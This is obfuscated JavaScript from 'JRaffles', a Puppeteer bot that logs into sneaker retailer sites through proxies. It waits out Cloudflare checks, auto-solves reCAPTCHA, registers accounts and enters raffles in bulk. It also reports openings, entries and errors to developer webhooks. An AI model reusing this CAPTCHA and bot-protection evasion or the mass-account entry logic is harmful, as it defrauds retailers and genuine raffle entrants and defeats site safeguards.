        try {
            const _0x4c9be7 = await _0x488a97['newPage'](), _0x6eafd3 = await _0x4c9be7['target']()['createCDPSession'](), { windowId: _0x6a4d42 } = await _0x6eafd3['send']('Browser.getWindowForTarget');
            await _0x4c9be7['authenticate']({
                'username': '' + _0x3b0fa4[0x2],
                'password': '' + _0x3b0fa4[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x2d6ecd['name'] + ']\x20Task\x20' + (_0x483d81 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4c9be7['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x18cf54() + '\x20[' + _0x2d6ecd['name'] + ']\x20Task\x20' + (_0x483d81 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x73378f(0xbb8), await _0x6eafd3['send']('Browser.setWindowBounds', {
                'windowId': _0x6a4d42,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x73378f(0x1f40);
            try {
                await _0x4c9be7['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            await _0x73378f(0x1388), console['log'](_0x18cf54() + '\x20[' + _0x2d6ecd['name'] + ']\x20Task\x20' + (_0x483d81 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4c9be7['type']('input[name=\x22email\x22]', '' + _0x3b3fac[_0x483d81]['Email']), await _0x73378f(0x1f4), await _0x4c9be7['type']('input[name=\x22password\x22]', '' + _0x3b3fac[_0x483d81]['Password']), await _0x73378f(0x258), await _0x4c9be7['$eval']('#login-form', _0x30da58 => _0x30da58['submit']()), await _0x4c9be7['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x73378f(0x1f4), await _0x4c9be7['goto']('' + _0x3b3fac[_0x483d81]['Url']), await _0x4c9be7['waitForSelector']('#product-images'), console['log'](_0x18cf54() + '\x20[' + _0x2d6ecd['name'] + ']\x20Task\x20' + (_0x483d81 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3b3fac[_0x483d81]['Size']);
            if (_0x3b3fac[_0x483d81]['Size'] != 'RANDOM') {
                var _0x527249 = '\x20' + _0x3b3fac[_0x483d81]['Size'] + '\x20';
                const _0x2d52d0 = await _0x4c9be7['$x']('//span[contains(text(),\x20' + _0x527249 + ')]');
                await _0x2d52d0[0x0]['click']();
            } else {
                const _0x1ca178 = await _0x4c9be7['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                var _0x1f6a83 = Math['round'](Math['random']() * (_0x1ca178['length'] - 0x1));
                await _0x1ca178[_0x1f6a83]['click']();
            }
            await _0x73378f(0x258), await _0x4c9be7['click']('#cookieChoiceDismiss'), await _0x73378f(0x3e8), await _0x4c9be7['type']('#instagram-account', '' + _0x3b3fac[_0x483d81]['Follower']), await _0x73378f(0x28a), await _0x4c9be7['click']('#book-btn'), await _0x73378f(0xbb8), await _0x4c9be7['waitForSelector']('#recaptcha-container'), await _0x73378f(0x1f4), console['log'](_0x18cf54() + '\x20[' + _0x2d6ecd['name'] + ']\x20Task\x20' + (_0x483d81 + 0x1) + '\x20:\x20' + _0x5ecce5['cyan']('Solving\x20Captcha')), await _0x4c9be7['solveRecaptchas'](), console['log'](_0x18cf54() + '\x20[' + _0x2d6ecd['name'] + ']\x20Task\x20' + (_0x483d81 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x73378f(0x7d0), await _0x4c9be7['$eval']('#book-btn-for-sure', _0x12fa01 => _0x12fa01['click']()), await _0x73378f(0x12c), await _0x4c9be7['click']('#book-btn-for-sure'), await _0x73378f(0xdac);
            const _0xc508ca = await _0x4c9be7['$eval']('.reservation-popup\x20>\x20.title', _0x57af20 => {
                return _0x57af20['innerHTML'];
            });
            if (_0xc508ca) {
                console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x2d6ecd['name'] + ']\x20Task\x20' + (_0x483d81 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                var _0x3c0303 = await _0x3553d9(_0x3b3fac[_0x483d81], _0x2d6ecd, 'dev', ![]), _0x48febf = await _0x3553d9(_0x3b3fac[_0x483d81], _0x2d6ecd, 'pub', ![]);
                const _0x1ff091 = {
                    'succesDEVMSG': { 'embeds': [_0x3c0303] },
                    'succesPUBMSG': { 'embeds': [_0x48febf] }
                };
                try {
                    _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x1ff091['succesDEVMSG']), await _0x73378f(0xc8), await _0x278fc0(_0x4c279b, _0x1ff091['succesDEVMSG']), await _0x73378f(0xc8), await _0x278fc0(_0x319480, _0x1ff091['succesPUBMSG']);
                } catch (_0x221192) {
                    console['log'](_0x5ecce5['yellow'](_0x18cf54() + '\x20[' + _0x2d6ecd['name'] + ']\x20Task\x20' + (_0x483d81 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x221192));
                }
            } else
                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
        } catch (_0x882611) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x2d6ecd['name'] + ']\x20Task\x20' + (_0x483d81 + 0x1) + '\x20:\x20' + _0x882611)), _0x52f65f = '' + _0x882611;
            var _0x2facbf = await _0x3553d9(_0x3b3fac[_0x483d81], _0x2d6ecd, 'dev', !![], _0x52f65f), _0x3c0303 = await _0x3553d9(_0x3b3fac[_0x483d81], _0x2d6ecd, 'dev', ![]), _0x48febf = await _0x3553d9(_0x3b3fac[_0x483d81], _0x2d6ecd, 'pub', ![]);
            const _0x22a025 = {
                'succesDEVMSG': { 'embeds': [_0x3c0303] },
                'succesPUBMSG': { 'embeds': [_0x48febf] }
            };
            _0x22a025['errorDEV'] = { 'embeds': [_0x2facbf] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x22a025['errorDEV']), await _0x278fc0(_0x51b669, _0x22a025['errorDEV']), _0x882611 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xee1c26 = 'yes');
        } finally {
            _0x488a97['close']();
            if (_0xee1c26 == 'yes' && _0x58d12b != 0x5 && _0x52f65f != 'Size\x20Not\x20Found') {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x2d6ecd['name'] + ']\x20Task\x20' + (_0x483d81 + 0x1) + '\x20:\x20Retrying')), _0x483d81 = _0x483d81 - 0x1, _0x58d12b = _0x58d12b + 0x1;
                continue;
            }
            console['log'](_0x18cf54() + '\x20[' + _0x2d6ecd['name'] + ']\x20Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x29a997() {
    await _0x21e85f(), console['clear']();
    if (_0x2f0e91 != 'devkey') {
        let _0x37157a = await _0x434fd7['autoUpdate']();
        if (_0x37157a === 'yes')
            return _0x5cdc19('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x51e3af == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x73378f(0x2710);
        ;
    }
    await _0x35d023(_0x51e3af);
    if (_0x2f3a5c === ![])
        return console['log']('Closing\x20Browser'), await _0x73378f(0xbb8);
    else
        try {
            var _0x3ae4a7 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x5746a9
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x2f0e91
                    }
                ]
            }];
            const _0xdb29e1 = { 'embeds': _0x3ae4a7 };
            var _0x451293 = await _0x3553d9(null, null, 'open', ![]);
            const _0x35c9e1 = { 'openDEVMSG': { 'embeds': [_0x451293] } };
            await _0x278fc0(_0x4dc254, _0x35c9e1['openDEVMSG']);
            async function _0x3598ab() {
                _0x992352('JRaffles\x20' + _0x2f0e91), console['clear'](), console['log']('Welcome\x20to\x20' + _0x5ecce5['cyan']('JRaffles();') + '\x20' + _0x2f0e91), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x24afd1 = 0x0; _0x24afd1 < _0x49a3de['length'] - 0x3; _0x24afd1++) {
                    if (_0x49a3de[_0x24afd1]['name'] === 'Reload\x20Settings' || _0x49a3de[_0x24afd1]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x24afd1 + ')\x20[' + _0x49a3de[_0x24afd1]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x49a3de['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x49a3de['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x49a3de['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x502364();
                if (taskModule > _0x49a3de['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x73378f(0x3e8), _0x3598ab();
                if (_0x49a3de[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x58a2a4(_0x49a3de[taskModule]['modules']);
                    var _0x90e721 = _0x49a3de[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x414054 = await _0xaeb791(), _0x389044 = await _0x54b010();
                        await _0x3f49ef(_0x389044, _0x414054, _0x90e721);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x414054 = await _0xaeb791(), _0x389044 = await _0x54b010();
                            await _0x4cfe38(_0x389044, _0x414054, _0x90e721);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x414054 = await _0xaeb791(), _0x3c37c8 = await _0x3bf6be(), _0x263a6a = _0x3c37c8['split'](';');
                                await _0x9f879(_0x263a6a, _0x414054, _0x90e721);
                            }
                        }
                    }
                    return _0x3598ab();
                }
                if (_0x49a3de[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x58a2a4(_0x49a3de[taskModule]['modules']);
                        var _0x90e721 = _0x49a3de[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x414054 = await _0xaeb791(), _0x57f58c = await _0x54b010();
                            await _0x478ef8(_0x57f58c, _0x414054, _0x90e721);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x414054 = await _0xaeb791(), _0x57f58c = await _0x54b010();
                                await _0x1ed827(_0x57f58c, _0x414054, _0x90e721);
                            }
                        }
                    } catch (_0x17ecdc) {
                        console['log'](_0x17ecdc), await _0x73378f(0xfa0);
                    }
                    return _0x3598ab();
                }
                if (_0x49a3de[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x58a2a4(_0x49a3de[taskModule]['modules']);
                    var _0x90e721 = _0x49a3de[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x414054 = await _0xaeb791(), _0x37f27d = await _0x54b010();
                    if (_0x37f27d[0x0]['Url'] == '' || _0x37f27d[0x0]['Url'] == undefined) {
                        await _0x1c2fb2(_0x414054);
                        var _0x198734 = await _0x1feb93();
                        return await afewFunction('' + _0x1752eb[_0x198734], 'nor', _0x90e721, _0x37f27d, _0x414054), _0x3598ab();
                    }
                    return await afewFunction(_0x37f27d[0x0]['Url'], 'nor', _0x90e721, _0x37f27d, _0x414054), _0x3598ab();
                } else {
                    if (_0x49a3de[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x58a2a4(_0x49a3de[taskModule]['modules']);
                        var _0x90e721 = _0x49a3de[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x414054 = await _0xaeb791(), _0x18837c = await _0x54b010();
                            console['log']('Starting\x20' + _0x18837c['length'] + '\x20MAHA\x20Tasks');
                            for (var _0x2cd003 = 0x0; _0x2cd003 < _0x18837c['length']; _0x2cd003++) {
                                console['log'](_0x18cf54() + '\x20[' + _0x90e721['name'] + ']\x20Task\x20' + (_0x2cd003 + 0x1) + ':\x20Getting\x20Session');
                                try {
                                    await _0x4ba913(_0x2cd003, 'nor', _0x90e721, _0x18837c, _0x414054), console['log'](_0x18cf54() + '\x20[' + _0x90e721['name'] + ']\x20Sleeping\x20for\x20' + _0x5690b2['MahaDelay'] + '\x20ms'), await _0x73378f(_0x5690b2['MahaDelay']);
                                } catch (_0x2104a5) {
                                    console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x90e721['name'] + ']\x20Task\x20' + (_0x2cd003 + 0x1) + ':\x20Error\x20' + _0x2104a5));
                                }
                            }
                            ;
                            return _0x3598ab();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x414054 = await _0xaeb791();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x3c37c8 = await _0x3bf6be(), _0x263a6a = _0x3c37c8['split'](';'), console['log'](_0x263a6a['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0x2cd003 = 0x0; _0x2cd003 < _0x263a6a['length']; _0x2cd003++) {
                                    _0x90e721['url'] = _0x263a6a[_0x2cd003], console['log'](_0x18cf54() + '\x20[' + _0x90e721['name'] + ']\x20Task\x20' + (_0x2cd003 + 0x1) + ':\x20Getting\x20Session');
                                    try {
                                        await _0x4ba913(_0x2cd003, 'ver', _0x90e721, _0x18837c, _0x414054), console['log'](_0x18cf54() + '\x20[' + _0x90e721['name'] + ']\x20Sleeping\x20for\x20' + _0x5690b2['verificationDelay'] + '\x20ms'), await _0x73378f(_0x5690b2['verificationDelay']);
                                    } catch (_0x27a74c) {
                                        console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x90e721['name'] + ']\x20Task\x20' + (_0x2cd003 + 0x1) + ':\x20Error\x20' + _0x27a74c));
                                    }
                                }
                                ;
                                return _0x3598ab();
                            }
                        }
                    } else {
                        if (_0x49a3de[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x58a2a4(_0x49a3de[taskModule]['modules']);
                            var _0x90e721 = _0x49a3de[taskModule]['modules'][taskFunction], _0x414054 = await _0xaeb791(), _0x2caab4 = await _0x54b010();
                            return await _0x5309d5(_0x2caab4, _0x414054, _0x90e721), await _0x73378f(0x1388), _0x3598ab();
                        } else {
                            if (_0x49a3de[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x58a2a4(_0x49a3de[taskModule]['modules']);
                                var _0x90e721 = _0x49a3de[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x414054 = await _0xaeb791(), _0x98db2a = await _0x54b010();
                                    console['log']('Starting\x20' + _0x5ecce5['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0x2cd003 = 0x0; _0x2cd003 < _0x98db2a['length']; _0x2cd003++) {
                                        console['log'](_0x18cf54() + '\x20[' + _0x90e721['name'] + ']\x20Task\x20' + (_0x2cd003 + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x14f394(_0x2cd003, 'nor', _0x90e721, _0x98db2a, _0x414054);
                                        } catch (_0xc5fb2f) {
                                            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x90e721['name'] + ']\x20Task\x20' + (_0x2cd003 + 0x1) + ':\x20Task\x20failed\x20' + _0xc5fb2f));
                                        }
                                        console['log'](_0x18cf54() + '\x20[' + _0x90e721['name'] + ']\x20Sleeping\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
                                    }
                                    return _0x3598ab();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x414054 = await _0xaeb791();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x3c37c8 = await _0x3bf6be(), _0x263a6a = _0x3c37c8['split'](';'), console['log'](_0x263a6a['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0x2cd003 = 0x0; _0x2cd003 < _0x263a6a['length']; _0x2cd003++) {
                                            try {
                                                _0x90e721['url'] = _0x263a6a[_0x2cd003], console['log'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Task\x20' + (_0x2cd003 + 0x1) + ':\x20Getting\x20Session'), await _0x14f394(_0x2cd003, 'ver', _0x90e721, null, _0x414054), console['log'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0x5690b2['verificationDelay'] + '\x20ms'), await _0x73378f(_0x5690b2['verificationDelay']);
                                            } catch (_0x19ecb8) {
                                                console['log'](_0x19ecb8), await _0x73378f(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x3598ab();
                                    }
                                }
                                ;
                            } else {
                                if (_0x49a3de[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x58a2a4(_0x49a3de[taskModule]['modules']);
                                    var _0x90e721 = _0x49a3de[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x5de0be('https://bouncewear.com/nl/account/register', _0x90e721);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x49a3de[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x58a2a4(_0x49a3de[taskModule]['modules']);
                                        var _0x90e721 = _0x49a3de[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x414054 = await _0xaeb791(), _0x24c52f = await _0x54b010();
                                            return await _0x32eccf('https://patta.nl/account/register', _0x90e721, _0x24c52f, _0x414054), _0x3598ab();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x414054 = await _0xaeb791(), _0x24c52f = await _0x54b010();
                                                return await _0x45785c('', _0x90e721, _0x24c52f, _0x414054), _0x3598ab();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x49a3de[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x58a2a4(_0x49a3de[taskModule]['modules']);
                                            var _0x90e721 = _0x49a3de[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x414054 = await _0xaeb791(), _0x4c49ed = await _0x54b010();
                                                return await _0x3d8232('https://slamjam.nl/account/register', _0x90e721, _0x4c49ed, _0x414054), _0x3598ab();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x414054 = await _0xaeb791(), _0x4c49ed = await _0x54b010();
                                                    return await _0x4c1e3c('', _0x90e721, _0x4c49ed, _0x414054), _0x3598ab();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x49a3de[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x58a2a4(_0x49a3de[taskModule]['modules']);
                                                var _0x90e721 = _0x49a3de[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x414054 = await _0xaeb791(), _0x554605 = await _0x54b010();
                                                    return await _0x441c87('https://www.kickz.com/nl/login/', _0x90e721, _0x554605, _0x414054), _0x3598ab();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x414054 = await _0xaeb791(), _0x554605 = await _0x54b010();
                                                        return await _0x147c4d(_0x90e721, _0x554605, _0x414054), _0x3598ab();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x49a3de[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x58a2a4(_0x49a3de[taskModule]['modules']);
                                                    var _0x90e721 = _0x49a3de[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x414054 = await _0xaeb791(), _0x4ad5f9 = await _0x54b010();
                                                        return await _0x1e19cb(_0x90e721, _0x4ad5f9, _0x414054), _0x3598ab();
                                                    }
                                                } else {
                                                    if (_0x49a3de[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x73378f(0x3e8), _0x3598ab();
                                                    else {
                                                        if (_0x49a3de[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0xe8b7c = _0x49a3de[taskModule]['name'], _0x414054 = await _0xaeb791();
                                                            const _0x4dc58e = await _0x3bf6be();
                                                            var _0x263a6a = _0x4dc58e['split'](';');
                                                            await _0x409f21(_0x263a6a, _0xe8b7c, _0x414054);
                                                        } else {
                                                            if (_0x49a3de[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x5419f2 = 0x0;
                                                                for (const _0x528a74 in _0x5690b2) {
                                                                    console['log']('(' + _0x5419f2 + ')\x20' + _0x528a74 + '\x20:\x20' + _0x5690b2[_0x528a74]), _0x5419f2++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x5419f2 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x981ef9 = await _0x4f1171();
                                                                if (_0x981ef9 == _0x5419f2)
                                                                    return _0x3598ab();
                                                                console['clear'];
                                                                var _0x456331 = 0x0;
                                                                for (var _0xf5141 in _0x5690b2) {
                                                                    if (_0x981ef9 == _0x456331) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0xf5141 + '\x20:'), _0x5690b2[_0xf5141] = await _0x37d15c(), _0x536860['writeFileSync']('../settings.json', JSON['stringify'](_0x5690b2));
                                                                        break;
                                                                    } else
                                                                        _0x456331++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x73378f(0xbb8), _0x3598ab();
                                                            } else {
                                                                if (_0x49a3de[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0x21e85f(), _0x3598ab();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x49a3de[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x4352c8 = await _0x33f141();
                                                                        _0x4352c8 == 'ModuleVoorDeBoys' ? (await _0x1c2fb2(), await _0x1feb93(), await afewFunction(_0x1752eb[_0x198734], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x73378f(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x3598ab();
        } catch (_0x2f1ab0) {
            return console['log'](_0x2f1ab0), await _0x73378f(0x3a98);
        }
}
;
_0x992352('JRaffles\x20' + _0x2f0e91), _0x21e85f();
try {
    _0x29a997();
} catch (_0x1f19ab) {
    var _0x315429 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x5746a9
            },
            {
                'name': 'Version',
                'value': '' + _0x2f0e91
            },
            {
                'name': 'Error',
                'value': '' + _0x1f19ab
            }
        ]
    }];
    const _0x457fa9 = { 'embeds': _0x315429 };
    _0x278fc0(_0x51b669, _0x457fa9);
}